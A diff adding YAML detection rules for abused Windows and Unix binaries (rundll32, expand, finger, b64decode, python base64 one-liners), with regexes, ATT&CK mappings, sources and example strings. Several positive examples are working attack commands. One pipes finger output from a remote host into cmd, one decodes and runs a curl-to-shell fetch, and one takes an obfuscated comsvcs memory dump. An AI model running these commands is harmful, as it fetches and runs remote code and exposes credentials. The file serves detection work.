+      - 'C:\Windows\System32\rundll32.exe C:\Windows\System32\printui.dll,PrintUIEntry /il'
+
+- id: mention.lolbin_rundll32_url_dll_any
+  title: url.dll OpenURL or FileProtocolHandler text
+  match:
+    anchored: 'url\.dll, {0,1}(?:OpenURL|FileProtocolHandler)\b'
+  case_sensitive: false
+  strength: weak
+  attack: [T1218.011]
+  telemetry: [any]
+  source:
+    name: LOLBAS project, Url.dll
+    url: https://github.com/LOLBAS-Project/LOLBAS/blob/98a39d57b0a3873d635cd5594f2dbffa83891bc3/yml/OSLibraries/Url.yml
+    license: GPL-3.0
+    upstream_id: Url.dll
+  rationale: >-
+    Any url.dll open call. Applications use it to open web links in the default browser, so with an http(s) target
+    it is a weak candidate; the medium entry covers file, UNC and script targets.
+  examples:
+    positive:
+      - 'rundll32.exe url.dll,FileProtocolHandler https://intranet.example.org/'
+    negative:
+      - 'rundll32.exe shell32.dll,OpenAs_RunDLL C:\Temp\a.log'
+      - 'C:\Windows\System32\rundll32.exe C:\Windows\System32\printui.dll,PrintUIEntry /il'
+
+- id: mention.lolbin_rundll32_desk_screensaver
+  title: rundll32 desk.cpl InstallScreenSaver text
+  match:
+    literal: ['desk.cpl,InstallScreenSaver']
+  case_sensitive: false
+  strength: medium
+  attack: [T1218.011, T1546.002]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Rundll32 InstallScreenSaver Execution (Christopher Peacock, SCYTHE, TactiKoolSec)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_rundll32_installscreensaver.yml
+    license: DRL-1.1
+    upstream_id: 15bd98ea-55f4-4d37-b09a-e7caa0fa2221
+  rationale: >-
+    Installing a 'screensaver' through desk.cpl runs the .scr, which is any executable (LOLBAS Desk). Installing a
+    real screensaver is the rule's listed false positive, so it is medium.
+  examples:
+    positive:
+      - 'rundll32.exe desk.cpl,InstallScreenSaver C:\Users\Public\x.scr'
+    negative:
+      - 'rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,1'
+      - 'control.exe desk.cpl,,@screensaver'
+
+- id: mention.lolbin_rundll32_control_rundll_dll
+  title: rundll32 shell32 Control_RunDLL text with a .dll, .exe or .ocx argument
+  match:
+    anchored: 'shell32\.dll, {0,1}Control_RunDLL {1,3}["'']?[^\n"'' ]{1,200}\.(?:dll|exe|ocx)\b'
+  case_sensitive: false
+  strength: medium
+  attack: [T1218.011, T1218.002]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Shell32 DLL Execution in Suspicious Directory (Christian Burkard, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_rundll32_shell32_susp_execution.yml
+    license: DRL-1.1
+    upstream_id: 32b96012-7892-429e-b26c-ac2bf46066ff
+  rationale: >-
+    Control_RunDLL normally opens a .cpl applet; given a DLL or executable it loads it as a Control Panel item
+    (LOLBAS Shell32). The rule rates the user-directory case high; across all paths a few vendor tools do this, so
+    it is medium.
+  examples:
+    positive:
+      - 'rundll32.exe shell32.dll,Control_RunDLL C:\Users\Public\x.dll'
+    negative:
+      - 'rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,1'
+      - 'rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl'
+
+- id: mention.lolbin_rundll32_shellexec_rundll
+  title: 'ShellExec_RunDLL text with a temp or user path, comspec or a script host'
+  match:
+    anchored: 'ShellExec_RunDLL[^\n]{0,200}(?:\\Desktop\\|\\Temp\\|\\Users\\Public\\|comspec|iex|Invoke-|msiexec|odbcconf|regsvr32)'
+  case_sensitive: false
+  strength: medium
+  attack: [T1218.011]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Suspicious Usage Of ShellExec_RunDLL (Nasreddine Bencherchali, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_rundll32_susp_shellexec_execution.yml
+    license: DRL-1.1
+    upstream_id: d87bd452-6da1-456e-8155-7dc988157b7d
+  rationale: >-
+    The rule's scope: ShellExec_RunDLL starting something from Desktop, Temp or Public, or handing off to comspec,
+    iex, Invoke-*, msiexec, odbcconf or regsvr32 (LOLBAS Shell32). Settings and URL handlers ('ms-settings:') use the
+    same export and are not matched. The rule rates it high; a few shell integrations launch from Desktop, so it is
+    medium.
+  examples:
+    positive:
+      - 'rundll32 SHELL32.DLL,ShellExec_RunDLL C:\Users\Public\x.exe'
+    negative:
+      - 'rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl'
+      - 'rundll32.exe shell32.dll,OpenAs_RunDLL C:\Temp\a.log'
+      - 'rundll32.exe shell32.dll,ShellExec_RunDLL "ms-settings:windowsupdate"'
+
+- id: mention.lolbin_rundll32_ordinal_call
+  title: 'rundll32 text with a DLL path and an ordinal export reference'
+  match:
+    anchored: 'rundll32(?:\.exe)?[\"'']? {1,3}[\"'']?[^\n\", ]{0,150}[\\/][^\n\", \\/]{1,80}\.(?:dll|ocx|cpl|exe|tmp|dat|bin)[\"'']?, {0,1}#[-+]?[0-9]{1,5}\b'
+  case_sensitive: false
+  strength: medium
+  attack: [T1218.011]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: DLL Call by Ordinal Via Rundll32.EXE (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules-threat-hunting/windows/process_creation/proc_creation_win_rundll32_by_ordinal.yml
+    license: DRL-1.1
+    upstream_id: e79a9e79-eb72-4e78-a628-0e7e8f59e89c
+  rationale: >-
+    Calling an export by number hides which function runs and is common in loader DLLs dropped on disk. This entry
+    needs a DLL given with a path; bare system DLL names such as 'shell32.dll,#61' (the Run dialog) are the weak
+    entry. Build tools and EdgeHTML also call exports by ordinal from full paths, so it is medium.
+  examples:
+    positive:
+      - 'rundll32.exe C:\Users\Public\x.dll,#2'
+      - 'rundll32.exe "C:\ProgramData\a\b.dat",#1'
+    negative:
+      - 'rundll32.exe shell32.dll,#61'
+      - 'rundll32.exe C:\Windows\System32\printui.dll,PrintUIEntry /il'
+
+- id: mention.lolbin_rundll32_obfuscated_ordinal
+  title: 'rundll32 text with an obfuscated-form ordinal (#-, #+, #0, #655xx)'
+  match:
+    anchored: 'rundll32(?:\.exe)?["'']? [^\n]{1,200}, {0,1}#(?:[-+][0-9]|0[0-9]|65[56][0-9])'
+  case_sensitive: false
+  strength: medium
+  attack: [T1218.011, T1027]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Potential Obfuscated Ordinal Call Via Rundll32 (Nasreddine Bencherchali, Swachchhanda Shrawan Poudel, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_rundll32_obfuscated_ordinal_call.yml
+    license: DRL-1.1
+    upstream_id: 43fa5350-db63-4b8f-9a01-789a427074e1
+  rationale: >-
+    Ordinals written as '#-', '#+', zero-padded or wrapped past 65535 resolve to the same export but evade rules that
+    look for a specific number (comsvcs MiniDump #24 is the usual target). Legitimate callers write plain ordinals,
+    so it is medium as upstream.
+  examples:
+    positive:
+      - 'rundll32.exe comsvcs.dll,#+24 624 C:\Users\Public\l.dmp full'
+    negative:
+      - 'rundll32.exe shell32.dll,#61'
+      - 'rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL desk.cpl'
+
+- id: mention.lolbin_rundll32_ordinal_bare
+  title: rundll32 text with a bare DLL name and an ordinal export reference
+  match:
+    anchored: 'rundll32(?:\.exe)?["'']? {1,3}["'']?[A-Za-z0-9_.-]{1,60}\.(?:dll|ocx|cpl)["'']?, {0,1}#[0-9]{1,5}\b'
+  case_sensitive: false
+  strength: weak
+  attack: [T1218.011]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: DLL Call by Ordinal Via Rundll32.EXE (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules-threat-hunting/windows/process_creation/proc_creation_win_rundll32_by_ordinal.yml
+    license: DRL-1.1
+    upstream_id: e79a9e79-eb72-4e78-a628-0e7e8f59e89c
+  rationale: >-
+    A system DLL called by ordinal without a path. Windows itself uses forms such as 'shell32.dll,#61' (the Run
+    dialog) and 'shell32.dll,#44', so it is a weak candidate; the arguments after the ordinal decide.
+  examples:
+    positive:
+      - 'rundll32.exe shell32.dll,#44 C:\Users\Public\x.dll'
+    negative:
+      - 'rundll32.exe C:\Windows\System32\printui.dll,PrintUIEntry /il'
+      - 'rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl'
+
+- id: mention.lolbin_expand_cab_to_user_path
+  title: 'expand -F: text with a user, ProgramData or admin-share destination'
+  match:
+    anchored: 'expand(?:\.exe)?[\"'']? [^\n]{0,200}[-/]F:[^\n]{0,150}(?::\\Perflogs\\|:\\ProgramData|:\\Users\\Public\\|\\Admin\$\\|\\AppData\\Local\\Temp\\|\\AppData\\Roaming\\|\\C\$\\)'
+  case_sensitive: false
+  strength: medium
+  attack: [T1140, T1105]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Potentially Suspicious Cabinet File Expansion (Bhabesh Raj, X__Junior, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_expand_cabinet_files.yml
+    license: DRL-1.1
+    upstream_id: 9f107a84-532c-41af-b005-8d12a607639f
+  rationale: >-
+    Expanding a cabinet into ProgramData, Public, AppData or an admin share is how CAB-packed payloads are unpacked
+    (LOLBAS Expand). Vendor updaters (the rule excludes a Dell updater) do it too, so it is medium. The rule's
+    C:\Windows\Temp destination is where Windows Update and servicing stage KB cabinets, so it is the separate weak
+    entry.
+  examples:
+    positive:
+      - 'expand C:\Users\Public\a.cab -F:* C:\ProgramData\x'
+    negative:
+      - 'expand D:\Drivers\net.cab -F:* D:\Drivers\net'
+      - 'Nov 21 10:07:00 ws01 TrustedInstaller: Windows Update package KB5032189 expanded'
+      - 'expand C:\Windows\Temp\KB5032189.cab -F:* C:\Windows\Temp\KB5032189'
+
+- id: mention.lolbin_expand_cab_to_windows_temp
+  title: 'expand -F: text with a C:\Windows\Temp destination'
+  match:
+    anchored: 'expand(?:\.exe)?["'']? [^\n]{0,200}[-/]F:[^\n]{0,150}:\\Windows\\Temp\\'
+  case_sensitive: false
+  strength: weak
+  attack: [T1140, T1105]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Potentially Suspicious Cabinet File Expansion (Bhabesh Raj, X__Junior, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_expand_cabinet_files.yml
+    license: DRL-1.1
+    upstream_id: 9f107a84-532c-41af-b005-8d12a607639f
+  rationale: >-
+    The rule's Windows\Temp destination. Windows Update and servicing expand KB cabinets there routinely, so it is a
+    weak candidate; a non-KB cabinet name or an unusual parent decides.
+  examples:
+    positive:
+      - 'expand C:\Users\Public\a.cab -F:* C:\Windows\Temp\x'
+    negative:
+      - 'expand D:\Drivers\net.cab -F:* D:\Drivers\net'
+      - 'expand -D C:\Windows\Temp\KB5032189.cab'
+
+- id: mention.lolbin_finger_to_shell
+  title: finger output with a pipe into cmd or PowerShell
+  match:
+    anchored: 'finger(?:\.exe)? [^\n|]{1,200}\|[^\n]{0,40}\b(?:cmd|powershell)\b'
+  case_sensitive: false
+  strength: strong
+  attack: [T1105, T1059.003]
+  telemetry: [any]
+  source:
+    name: LOLBAS project, Finger.exe
+    url: https://github.com/LOLBAS-Project/LOLBAS/blob/98a39d57b0a3873d635cd5594f2dbffa83891bc3/yml/OSBinaries/Finger.yml
+    license: GPL-3.0
+    upstream_id: Finger.exe
+  rationale: >-
+    'finger user@host | more +2 | cmd' runs commands served by a finger daemon, a download cradle used by commodity
+    loaders. Nobody pipes finger output into a shell for administration.
+  examples:
+    positive:
+      - 'cmd /c finger x@203.0.113.7 | more +2 | cmd'
+    negative:
+      - 'finger alice@mail.corp.example.org'
+      - 'Nov 21 10:08:00 lnx01 bash[700]: HISTORY: finger -l alice'
+
+- id: mention.lolbin_finger_user_at_host
+  title: finger user@host text
+  match:
+    anchored: 'finger(?:\.exe)? {1,3}[^\s@|]{1,64}@[^\s|]{1,253}'
+  case_sensitive: false
+  strength: medium
+  attack: [T1105]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Finger.EXE Execution (Florian Roth, Nextron Systems, omkar72, oscd.community)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_finger_execution.yml
+    license: DRL-1.1
+    upstream_id: af491bca-e752-4b44-9c86-df5680533dbc
+  rationale: >-
+    The rule rates any finger.exe run high because its only common modern use is fetching data from a remote finger
+    service. On Unix, finger user@host is still an occasional directory lookup, so the text is medium.
+  examples:
+    positive:
+      - 'C:\Windows\System32\finger.exe data@203.0.113.7'
+    negative:
+      - 'Nov 21 10:09:00 lnx01 bash[701]: HISTORY: finger -l alice'
+      - 'Nov 21 10:09:01 lnx01 bash[702]: HISTORY: getent passwd alice'
+
+- id: mention.lolbin_b64decode_to_shell
+  title: BSD b64decode with a pipe into a shell
+  match:
+    anchored: 'b64decode [^|\n]{0,40}\| {0,3}(?:sudo )?(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b'
+  case_sensitive: true
+  strength: medium
+  attack: [T1140, T1059.004]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Linux Base64 Encoded Pipe to Shell (pH-T, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_base64_execution.yml
+    license: DRL-1.1
+    upstream_id: ba592c6d-6888-43c3-b8c6-689b8fe47337
+  rationale: >-
+    The rule's base64-decode-into-shell shape with the BSD and macOS decoder name: decoding straight into a shell
+    hides the real command. Provisioning scripts occasionally do it, so it is medium as upstream.
+  examples:
+    positive:
+      - 'Nov 21 10:10:00 bsd01 sh[700]: echo Y3VybCBodHRwOi8vMjAzLjAuMTEzLjcveCB8IHNo | b64decode -r | sh'
+    negative:
+      - 'Nov 21 10:10:01 bsd01 sh[701]: b64decode -r cert.b64 > cert.der'
+      - 'Nov 21 10:10:02 bsd01 sh[702]: echo hello | b64encode -r -'
+
+- id: mention.lolbin_python_base64_subprocess
+  title: 'python -c text with base64 decode and shell=True, os.system, exec or a -c string'
+  match:
+    anchored: 'python[0-9.]{0,4} {1,3}-c {1,3}[\"''][^\n]{0,40}import base64[^\n]{0,250}(?:shell {0,2}= {0,2}True|os\.system\(|exec\(|[\"'']-c[\"''])'
+  case_sensitive: false
+  strength: medium
+  attack: [T1140, T1059.006]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Python One-Liners with Base64 Decoding - Linux (Hugh Ryan, Swachchhanda Shrawan Poudel)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_python_base64_encoded_execution.yml
+    license: DRL-1.1
+    upstream_id: 55e862a8-dd9c-4651-807a-f21fcad56716
+  rationale: >-
+    The rule's python -c base64 one-liner with a code-running sink on the same line: subprocess with shell=True,
+    os.system, exec, or a shell given a '-c' string. Passing decoded bytes as data (input=, a file) is not matched.
+    Data scripts decode base64 but rarely run the result, so it is medium.
+  examples:
+    positive:
+      - 'Nov 21 10:11:00 lnx01 bash[703]: HISTORY: python3 -c ''import base64, subprocess; subprocess.run(base64.b64decode("aWQ=").decode(), shell=True)'''
+    negative:
+      - 'Nov 21 10:11:01 lnx01 bash[704]: HISTORY: python3 -c ''import base64; print(base64.b64decode("aGk=").decode())'''
+      - 'Nov 21 10:11:02 lnx01 bash[705]: HISTORY: python3 -m pip install --upgrade pip'
+      - 'Nov 21 10:11:03 lnx01 bash[706]: HISTORY: python3 -c ''import base64, subprocess; subprocess.run(["gpg", "--import"], input=base64.b64decode(open("k.b64").read()))'''
